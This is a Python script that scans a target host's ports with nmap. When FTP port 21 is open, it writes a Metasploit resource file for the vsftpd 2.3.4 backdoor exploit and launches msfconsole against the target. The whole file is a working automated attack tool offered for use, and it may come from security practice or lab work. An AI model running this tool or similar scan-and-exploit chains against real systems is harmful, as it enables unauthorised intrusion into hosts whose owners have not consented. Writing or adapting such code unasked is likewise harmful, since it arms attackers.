import nmap
from optparse import OptionParser
import pyfiglet
import os


class Vulnerability:
    def __init__(self):
        self.rcfile = open('meta.rc', 'w')

    def vsftpbackdoor(self, target):
        with open('meta.rc', 'w') as f:
            f.write('use exploit/unix/ftp/vsftpd_234_backdoor\n')
            f.write('set RHOST ' + str(target)+ "\n")
            f.write('exploit')
            f.close()


class Scanner:
    def __init__(self):
        self.ascii_banner = pyfiglet.figlet_format("Scanner")
        print(self.ascii_banner)
        self.nmScan = nmap.PortScanner()
        self.popular_ports_list = ['23', '554' , '3306', '179', '1080', '161', '162', '445', '5432', '9092', '6379', '80', '443', '22', '21', '8080', '23', '25' ,'53', '587', '993', '995', '8443', '465', '1080']
        self.opened_port = []
        self.vulnerability = Vulnerability()


    def tcpScan(self, target, port):
        self.nmScan.scan(target, port)
        state = self.nmScan[target]['tcp'][int(port)]['state']
        if state == 'open':
            print(f"[+] {port}/tcp  {state}")
            self.opened_port.append(port)
        else:
            print(f"[-] {port}/tcp  {state}")



    def exploit(self, target):
        if '21' in self.opened_port:
            print("[+] attempting vsftpd_234_backdoor")
            self.vulnerability.vsftpbackdoor(target)
        else:
            print("[+] <3")

        os.system('msfconsole -r meta.rc')


    def scan(self, target, ports):
        print(f"[+] Scanning for {target}")
        for port in ports:
            self.tcpScan(target, port)

        self.exploit(target)








def main():
    scanner = Scanner()

    parser = OptionParser('usage %prog -t <target host> -p <target port> ')

    parser.add_option('-t', dest='tgtHost', type='string', help='specify target host')
    parser.add_option('-p', dest='tgtPort', type='string', help='specify target port, separated by comma')

    # when arguments are given parse them
    (options, args) = parser.parse_args()


    tgtHost = options.tgtHost
    tgtPorts = str(options.tgtPort).split(",")

    if (tgtHost == None):
        print(parser.usage)
        exit(0)

    if tgtPorts[0] == 'None':
        print("[!] Popular Ports will be used")
        tgtPorts = scanner.popular_ports_list

    scanner.scan(tgtHost, tgtPorts)


if __name__ == '__main__':
    main()
